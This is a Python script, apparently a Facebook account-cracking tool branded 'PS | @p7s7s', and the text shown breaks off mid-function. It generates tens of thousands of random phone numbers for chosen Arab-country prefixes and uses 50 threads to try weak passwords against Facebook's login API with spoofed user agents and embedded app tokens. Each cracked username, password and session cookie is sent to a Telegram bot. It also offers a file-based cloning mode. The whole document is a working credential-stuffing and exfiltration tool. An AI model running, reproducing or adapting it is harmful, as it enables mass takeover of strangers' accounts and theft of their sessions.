#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#----------------<-IMPORT-MODULE->----------------#
import os
import sys
import time
import random
import uuid
import json
import string
import base64
import hashlib
import urllib.request
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

G = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
R = "\x1b[38;5;93m"   # كان أحمر → بنفسجي
W = "\x1b[38;5;15m"
B = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
Y = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
A = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
O = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
X = "\x1b[38;5;93m"   # كان وردي → خليته بنفسجي أقوى
P = "\x1b[38;5;93m"   # عدلته عشان يكون متناسق

BLUE_LIGHT = "\033[1;34m"
BLUE_DARK = "\033[0;34m"
BLUE_BRIGHT = "\033[1;94m"
CYAN = "\033[1;36m"

#----------------<-TELEGRAM CREDENTIALS->----------------#
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

def get_telegram_credentials():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
    clear_screen()
    print(logo)
    __LINE__()
    print(f"{xp} {O}ENTER YOUR TELEGRAM BOT TOKEN")
    __LINE__()
    token = input(f"{xpx} {R}INPUT TOKEN {xpxx} ")
    if token:
        TELEGRAM_BOT_TOKEN = token
    clear_screen()
    print(logo)
    __LINE__()
    print(f"{xp} {O}ENTER YOUR TELEGRAM CHAT ID")
    __LINE__()
    chat_id = input(f"{xpx} {R}INPUT CHAT ID {xpxx} ")
    if chat_id:
        TELEGRAM_CHAT_ID = chat_id

def send_telegram_message(message):
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

#----------------<-STYLE->----------------#
xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"

#----------------<-MODELS LIST FROM GITHUB->----------------#
MODELS_LIST = []
USER_AGENTS_LIST = []
MODELS_LOADED = False
USER_AGENTS_LOADED = False

def load_models_from_github():
    global MODELS_LIST, MODELS_LOADED
    try:
        models_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt"
        response = requests.get(models_url, timeout=10)
        if response.status_code == 200:
            MODELS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
            MODELS_LOADED = True
            return True
    except:
        pass
    MODELS_LIST = ["SM-G313ML", "GT-I9195", "SM-T530", "SM-J200F", "SM-J200G", "GT-I9060I"]
    MODELS_LOADED = True
    return False

def load_user_agents_from_github():
    global USER_AGENTS_LIST, USER_AGENTS_LOADED
    try:
        ua_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/user_agant.txt"
        response = requests.get(ua_url, timeout=10)
        if response.status_code == 200:
            USER_AGENTS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
            USER_AGENTS_LOADED = True
            return True
    except:
        pass
    USER_AGENTS_LIST = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]'
    ]
    USER_AGENTS_LOADED = True
    return False

#----------------<-CLEAR->----------------#
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

#----------------<-INTERNET->----------------#
try:
    requests.get("https://www.google.com", timeout=5)
except:
    clear_screen()
    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
    print(f"{G}━" * 56)
    sys.exit()

#----------------<-FILE-PATH->----------------#
sd_folder = os.path.join(os.getcwd(), "PS-Results")
sea_folders = ("RANDOM", "FILE")
os.makedirs(sd_folder, exist_ok=True)
for folder in sea_folders:
    os.makedirs(os.path.join(sd_folder, folder), exist_ok=True)

sdcard_folder = "/sdcard/PS-"
try:
    os.makedirs(sdcard_folder, exist_ok=True)
    for folder in sea_folders:
        os.makedirs(os.path.join(sdcard_folder, folder), exist_ok=True)
except:
    pass

#----------------<-DATE->----------------#
__dic__ = {
    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
}
__now__ = datetime.now()
__days__ = __now__.day
__months__ = __dic__[str(__now__.month)]
__years__ = __now__.year
__date__ = f'{W}{__days__}{G}/{W}{__months__}{G}/{W}{__years__}'

#----------------<-COUNTRY->----------------#
try:
    ip = requests.get("https://api.ipify.org", timeout=5).text
    ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
    af = json.loads(ip_info.text)
    __COUNTRYS__ = af.get('country', 'UNKNOWN').upper()
except:
    __COUNTRYS__ = "UNKNOWN"

#----------------<-VERSION->----------------#
try:
    versn = requests.get("https://raw.githubusercontent.com/NOOR-404/Control-room/main/VERSION", timeout=5).text.strip()
    version = str(versn)
except:
    version = "3.0"

#----------------<-LINE FUNCTION->----------------#
def __LINE__():
    print(f"{G}━" * 56)

#----------------<-LOGO->----------------#
version ='2.0'
xlinex = (f"{R}━"*56)
logo = f"""
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
{R}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
{R}╭━━━┳━━━╮
{R}┃╭━╮┃╭━╮┃
{R}┃╰━╯┃╰━━╮
{R}┃╭━━┻━━╮┃
{R}┃┃╱╱┃╰━╯┃
{R}╰╯╱╱╰━━━╯
{xlinex}
{W}  DEVELOPER {xpxx} PS{G}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{G}/{W}{version}
{xlinex}
{R}⫷⫸ 𝐷𝐸𝑉 𝑃𝑆 | @p7s7s ⫷⫸
{xlinex}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx} PS ~ p7s7s
{xp} TODAYS   {xpxx} {__date__}
{xlinex}"""

#----------------<-UA FUNCTIONS (USING GITHUB DATA)->----------------#
def _____UpDaTe_S1_____():
    global MODELS_LIST, USER_AGENTS_LIST
    if not MODELS_LOADED: load_models_from_github()
    if not USER_AGENTS_LOADED: load_user_agents_from_github()
    
    fbav3 = f'{random.randint(300,500)}.{random.randint(0,1)}.{random.randint(0,1)}.{random.randint(50,150)}.{random.randint(100,300)}'
    fbbv3 = str(random.randint(300000000,999999999))
    density3 = random.choice(['1.5','2.0','2.5','3.0'])
    width3 = random.choice(['720','1080','1440'])
    height3 = random.choice(['1600','1920','2340','2560'])
    fblc3 = random.choice(["en_US","en_GB","es_ES","fr_FR","ar_SA","bn_BD","pt_BR","de_DE"])
    fbrv3 = str(random.randint(400000000,999999999))
    fbcr3 = random.choice(["Verizon","AT&T","T-Mobile","Vodafone","Orange","O2","EE","Three"])
    
    if MODELS_LIST:
        fbdv3 = random.choice(MODELS_LIST)
        fbmf3 = "samsung" if fbdv3.startswith(("SM-","GT-")) else random.choice(['samsung','xiaomi','oneplus','google'])
    else:
        fbdv3 = random.choice(['SM-G991B','SM-G998B','2107113SG','KB2001','Pixel 6','Pixel 7'])
        fbmf3 = random.choice(['samsung','xiaomi','oneplus','google'])
    
    fbbd3 = fbmf3
    fbsv3 = f'{random.randint(11,14)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3 = fb3.split('|')[1]
    fbpn3 = fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent = '[FBAN/'+fban3+';FBAV/'+fbav3+';FBBV/'+fbbv3+';FBDM/{density='+density3+',width='+width3+',height='+height3+'};FBLC/'+fblc3+';FBRV/'+fbrv3+';FBCR/'+fbcr3+';FBMF/'+fbmf3+';FBBD/'+fbbd3+';FBPN/'+fbpn3+';FBDV/'+fbdv3+';FBSV/'+fbsv3+';'+bit3
    
    if USER_AGENTS_LIST:
        iphone = random.choice(USER_AGENTS_LIST)
    else:
        iphone = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]'
    return iphone + ' ' + agent

def _____UpDaTe_S2_____():
    global MODELS_LIST, USER_AGENTS_LIST
    if not MODELS_LOADED: load_models_from_github()
    if not USER_AGENTS_LOADED: load_user_agents_from_github()
    
    fbav3 = f'{random.randint(300,500)}.{random.randint(0,1)}.{random.randint(0,1)}.{random.randint(50,150)}.{random.randint(100,300)}'
    fbbv3 = str(random.randint(300000000,999999999))
    density3 = random.choice(['1.5','2.0','2.5','3.0'])
    width3 = random.choice(['720','1080','1440'])
    height3 = random.choice(['1600','1920','2340','2560'])
    fblc3 = random.choice(["en_US","en_GB","es_ES","fr_FR","ar_SA","bn_BD","pt_BR","de_DE"])
    fbrv3 = str(random.randint(400000000,999999999))
    fbcr3 = random.choice(["Verizon","AT&T","T-Mobile","Vodafone","Orange","O2","EE","Three"])
    
    if MODELS_LIST:
        fbdv3 = random.choice(MODELS_LIST)
        fbmf3 = "samsung" if fbdv3.startswith(("SM-","GT-")) else random.choice(['samsung','xiaomi','oneplus','google'])
    else:
        fbdv3 = random.choice(['SM-G991B','SM-G998B','2107113SG','KB2001','Pixel 6','Pixel 7'])
        fbmf3 = random.choice(['samsung','xiaomi','oneplus','google'])
    
    fbbd3 = fbmf3
    fbsv3 = f'{random.randint(11,14)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3 = fb3.split('|')[1]
    fbpn3 = fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent = '[FBAN/'+fban3+';FBAV/'+fbav3+';FBBV/'+fbbv3+';FBDM/{density='+density3+',width='+width3+',height='+height3+'};FBLC/'+fblc3+';FBRV/'+fbrv3+';FBCR/'+fbcr3+';FBMF/'+fbmf3+';FBBD/'+fbbd3+';FBPN/'+fbpn3+';FBDV/'+fbdv3+';FBSV/'+fbsv3+';'+bit3
    
    if USER_AGENTS_LIST:
        iphone = random.choice(USER_AGENTS_LIST)
    else:
        iphone = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]'
    return iphone + ' ' + agent

def _____UpDaTe_S3_____():
    global MODELS_LIST
    if not MODELS_LOADED: load_models_from_github()
    android_versions = ["10","11","12","13","14"]
    device = random.choice(MODELS_LIST) if MODELS_LIST else "SM-G991B"
    brand = "Samsung" if device.startswith(("SM-","GT-")) else random.choice(["Samsung","Xiaomi","OnePlus","Google"])
    android = random.choice(android_versions)
    fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
    fbbv = random.randint(100000000,999999999)
    width = random.choice([720,1080,1440])
    height = random.choice([1600,1920,2172,2400])
    density = random.choice([2.0,2.5,3.0,4.0])
    return f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"

#----------------<-SECOND TOOL FUNCTIONS (PS CRACKER)->----------------#
countries_codes = {
    "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
    "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
    "3": {"name": "UAE", "codes": ["050", "052", "054", "055", "056", "058"]},
    "4": {"name": "Qatar", "codes": ["330", "331", "332", "333", "334", "335"]},
    "5": {"name": "Kuwait", "codes": ["500", "503", "505", "506", "507", "509"]},
    "6": {"name": "Oman", "codes": ["710", "712", "714", "715", "716", "718"]},
    "7": {"name": "Bahrain", "codes": ["310", "311", "312", "313", "314", "315"]},
    "8": {"name": "Egypt", "codes": ["010", "011", "012", "015", "016", "017"]},
    "9": {"name": "Morocco", "codes": ["600", "601", "602", "603", "604", "605"]},
    "10": {"name": "Jordan", "codes": ["070", "071", "072", "077", "078", "079"]},
    "11": {"name": "Lebanon", "codes": ["030", "031", "032", "033", "034", "035"]},
    "12": {"name": "Iraq", "codes": ["0750", "0770", "0780"]},
    "13": {"name": "Tunisia", "codes": ["200", "201", "202", "203", "204", "205"]},
    "14": {"name": "Syria", "codes": ["090", "091", "092", "093", "094", "095"]},
    "15": {"name": "Yemen", "codes": ["700", "701", "702", "703", "704", "705"]},
    "16": {"name": "Libya", "codes": ["910", "911", "912", "913", "914", "915"]},
    "17": {"name": "Sudan", "codes": ["090", "091", "092", "093", "094", "095"]},
    "18": {"name": "Palestine", "codes": ["050", "051", "052", "053", "054", "055"]},
    "19": {"name": "Mauritania", "codes": ["410", "411", "412", "413", "414", "415"]},
    "20": {"name": "Somalia", "codes": ["060", "061", "062", "063", "064", "065"]},
    "21": {"name": "Djibouti", "codes": ["770", "771", "772", "773", "774", "775"]},
    "22": {"name": "Comoros", "codes": ["320", "321", "322", "323", "324", "325"]}
}

PS_ok = 0
PS_loop = 0

def get_random_ua_PS():
    android_versions = ["10", "11", "12", "13", "14"]
    devices = [
        "TECNO CK7n",
        "Samsung SM-G991B",
        "Xiaomi Redmi Note 12",
        "Infinix X6812",
        "Huawei Y9a"
    ]
    brands = {
        "TECNO CK7n": "TECNO",
        "Samsung SM-G991B": "Samsung",
        "Xiaomi Redmi Note 12": "Xiaomi",
        "Infinix X6812": "Infinix",
        "Huawei Y9a": "Huawei"
    }
    android = random.choice(android_versions)
    device = random.choice(devices)
    brand = brands[device]
    fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
    fbbv = random.randint(100000000,999999999)
    width = random.choice([720, 1080, 1440])
    height = random.choice([1600, 1920, 2172, 2400])
    density = random.choice([2.0, 2.5, 3.0, 4.0])
    
    ua = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""
    return ua

def get_cookies_PS(uid, password):
    try:
        temp_headers = {
            "Accept-Encoding": "gzip, deflate",
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-friendly-name": "authenticate",
            "x-fb-http-engine": "Liger",
            "x-fb-client-ip": "True",
            "x-fb-server-cluster": "True",
            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        }
        temp_headers["User-Agent"] = get_random_ua_PS()
        data = pm_PS(uid, password)
        req = requests.post('https://b-graph.facebook.com/auth/login', headers=temp_headers, data=data, timeout=10).json()
        if 'session_key' in req:
            cookies = ";".join([f"{key}={value}" for key, value in req.get('session_cookies', [{}])[0].items()])
            return cookies
        return ""
    except:
        return ""

def pm_PS(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

def show_countries_menu():
    __LINE__()
    print(f"{xp} SELECT COUNTRY:")
    __LINE__()
    for key, value in countries_codes.items():
        print(f" {xp1} {key}. {value['name']}")
    __LINE__()

def select_code():
    show_countries_menu()
    choice = input(f'{xp} Enter country number (1-22) {xpxx} ').strip()
    
    while choice not in countries_codes:
        print(f"{xp} {R}Invalid choice!{W}")
        choice = input(f'{xp} Enter country number (1-22) {xpxx} ').strip()
    
    country = countries_codes[choice]
    __LINE__()
    print(f"{xp} Country: {R}{country['name']}{W}")
    print(xp + " Available codes:")
    __LINE__()
    
    codes_list = country['codes']
    for i, code in enumerate(codes_list):
        print(f" {xp1} {i+1}. {code}")
    
    __LINE__()
    code_choice = input(f'{xp} Enter code number (1-{len(codes_list)}) {xpxx} ').strip()
    
    try:
        code_index = int(code_choice) - 1
        if 0 <= code_index < len(codes_list):
            selected_code = codes_list[code_index]
            __LINE__()
            print(f"{xp} Selected code: {R}{selected_code}{W}")
            return selected_code
        else:
            print(f"{xp} {R}Invalid choice! Using first code{W}")
            return codes_list[0]
    except ValueError:
        print(f"{xp} {R}Invalid choice! Using first code{W}")
        return codes_list[0]

def crackfree(ids, pwxs):
    global PS_ok, PS_loop
    sys.stdout.write(f'\r{xp} {R}<[{W}PS-{PS_loop}{R}]> {R}<[{W}OK-{PS_ok}{R}]>')
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            temp_headers = {
                "Accept-Encoding": "gzip, deflate",
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-friendly-name": "authenticate",
                "x-fb-http-engine": "Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            }
            temp_headers["User-Agent"] = get_random_ua_PS()
            data = pm_PS(ids, pw)
            req = requests.post('https://b-graph.facebook.com/auth/login', headers=temp_headers, data=data, timeout=8).json()
            
            if 'session_key' in req:
                uid = req["uid"]
                PS_ok += 1
                coki = get_cookies_PS(ids, pw)
                
                print(f"\n{xp} {R}<[PS-OK{R}]> {uid} | {pw}")
                __LINE__()
                
                m = f"""✅ OK PS
❖ - USERNAME : {uid}
❖ - PASSWORD : {pw}
❖ - COOKIES : {coki}
حساب شغال PS | @p7s7s ✅"""
                
                send_telegram_message(m)
                break
                
            elif 'www.facebook.com' in req.get("error", {}).get("message", ""):
                uid = req["error"]["error_data"]["uid"]
                print(f"\n{xp} {R}<[PS-CP{R}]> {uid} | {pw}")
                __LINE__()
                
                m = f"""⚠️ CP PS
PS | @p7s7s سكيور 💔
USERNAME : {uid}
PASSWORD : {pw}"""
                send_telegram_message(m)
                break
                
        except:
            continue
    
    PS_loop += 1

def __PS_CRACKER__(self):
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
    
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        get_telegram_credentials()
    
    clear_screen()
    print(logo)
    
    __LINE__()
    print(f"{xp} {O}PS PHONE NUMBER CRACKER")
    __LINE__()
    
    # Select country and code
    selected_code = select_code()
    __LINE__()
    print(f"{xp} Starting attack on code: {R}{selected_code}{W}")
    __LINE__()
    
    # Generate numbers
    id_list = []
    print(f"{xp} Generating phone numbers...")
    for _ in range(44444):
        nmp = "".join(random.choice('1234567890') for ing in range(7))
        id_list.append(nmp)
    
    clear_screen()
    print(logo)
    __LINE__()
    print(f"{xp} Attacking: {R}{selected_code}XXXXXXXXX{W}")
    __LINE__()
    print(f"{xp} Status: {R}Running...{W}")
    __LINE__()
    
    with ThreadPool(max_workers=50) as am:
        for idx in id_list:
            ids = selected_code + str(idx)
            pwxs = [
                ids, str(idx), "hama1234", "zaxo1234", "zaxozaxo",
                "kurd1234", "muhamad123", "kurdkurd", "123456789",
                "12345678", "1234567", "password", "pass1234",
                "qwerty123", "facebook123", "fb123456", ids[:8], ids[-8:],
                "19801980", "19811981", "19821982", "19831983", "19841984",
                "19851985", "19861986", "19871987", "19881988", "19891989",
                "19901990", "19911991", "19921992", "19931993", "19941994",
                "19951995", "19961996", "19971997", "19981998", "19991999",
                "20002000", "20012001", "20022002", "20032003", "20042004",
                "20052005", "20062006", "20072007", "20082008", "20092009",
                "20102010", "20112011", "20122012", "20132013", "20142014",
                "20152015", "20162016", "20172017", "20182018", "20192019",
                "20202020", "20212021", "20222022", "20232023", "20242024",
                "20252025", "20262026", "07800780", "07700770", "07500750",
                "12344321", "12341234", "12345678", "123456", "1234567",
                "11111234", "@1234@", "@123456@", "@1234567@", "@12345678@",
                "@@@@1111", "1111@@@@", "@@@@####"
            ]
            am.submit(crackfree, ids, pwxs)
    
    print('')
    __LINE__()
    print(f"{xp} PS Crack Completed")
    __LINE__()
    print(f"{xp} THANKS FOR USING.....! ")
    sys.exit()

#----------------<-PS CLASS->----------------#
class __SEAXNOOR__:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.twf = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.successful_attempts = 0

    def __MENU__(self):
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            get_telegram_credentials()
        clear_screen()
        print(logo)
        __LINE__()
        print(f"{xp1} {O}FILE CLONING ")
        print(f"{xp2} {O}PS PHONE CRACKER ")
        print(f"{xp5} {O}DOWNLOAD PROXY/MODEL FROM GITHUB ")
        print(f"{xp0} {O}EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} {R}INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "2":
            __PS_CRACKER__(self)
        elif __MENUC__ == "5":
            self.__DOWNLOAD_FILES__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} {R}EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} {R}INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()

    def __DOWNLOAD_FILES__(self):
        clear_screen()
        print(logo)
        __LINE__()
        print(f"{xp} {O}DOWNLOAD FILES FROM GITHUB")
        __LINE__()
        print(f"{xp1} {O}Download Proxy List (proxies.txt)")
        print(f"{xp2} {O}Download Model List (models.txt)")
        print(f"{xp3} {O}Download User Agent List (user_agant.txt)")
        print(f"{xp0} {O}Back to Main Menu")
        __LINE__()
        choice = input(f"{xpx} {R}INPUT CHOICE {xpxx} ")
        
        urls = {
            "1": ("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "proxies.txt"),
            "2": ("https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt", "models.txt"),
            "3": ("https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/user_agant.txt", "user_agant.txt")
        }
        
        if choice in urls:
            url, filename = urls[choice]
            try:
                print(f"{xp} {O}Downloading from {url}...")
                response = requests.get(url, timeout=30)
                with open(filename, 'w') as f:
                    f.write(response.text)
                print(f"{xp} {G}Successfully downloaded to {filename}")
                if filename == "models.txt": load_models_from_github()
                elif filename == "user_agant.txt": load_user_agents_from_github()
                __LINE__()
                input(f"{xpx} {R}Press Enter to continue...")
            except Exception as e:
                print(f"{xp} {R}Download failed: {str(e)}")
                time.sleep(2)
            self.__DOWNLOAD_FILES__()
        elif choice == "0":
            self.__MENU__()
        else:
            print(f"{xp} {R}Invalid choice!")
            time.sleep(1)
            self.__DOWNLOAD_FILES__()

    def __FILEX__(self):
        load_models_from_github()
        load_user_agents_from_github()
        clear_screen()
        print(logo)
        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}ids.txt (format: email|name)")
        print(f"{xp} SDCARD PATH {xpxx} {G}/{W}/sdcard/ids.txt")
        __LINE__()
        __fileloX__ = input(f"{xpx} {R}INPUT FILE PATH {xpxx} ")
        try:
            __fileXX__ = __fileloX__ if __fileloX__.startswith(("/","./")) else os.path.join(os.getcwd(), __fileloX__)
            if not os.path.exists(__fileXX__):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            with open(__fileXX__, 'r', encoding='utf-8', errors='ignore') as f:
                __fileckX__ = f.read().splitlines()
        except:
            __LINE__()
            print(f"{xp} {R}FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        clear_screen()
        print(logo)
        print(f"{xp1} {R}METHOD 1 (Graph)")
        print(f"{xp2} {R}METHOD 2 (B-Graph)")
        print(f"{xp3} {R}METHOD 3 (API)")
        print(f"{xp4} {R}METHOD 4 (B-API)")
        print(f"{xp5} {R}METHOD 5 (Android API) {G}[NEW]")
        __LINE__()
        __METHODF__ = input(f"{xpx} {R}INPUT METHOD {xpxx} ")

        clear_screen()
        print(logo)
        print(f"{xp1} {R}AUTO PASSLIST ")
        print(f"{xp2} {R}CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} {R}INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            clear_screen()
            print(logo)
            print(f"{xp1} {R}AUTO BASIC PASSLIST ")
            print(f"{xp2} {R}AUTO WEAK PASSLIST ")
            print(f"{xp3} {R}AUTO STRONG PASSLIST ")
            print(f"{xp4} {R}AUTO MIX PASSLIST ")
            __LINE__()
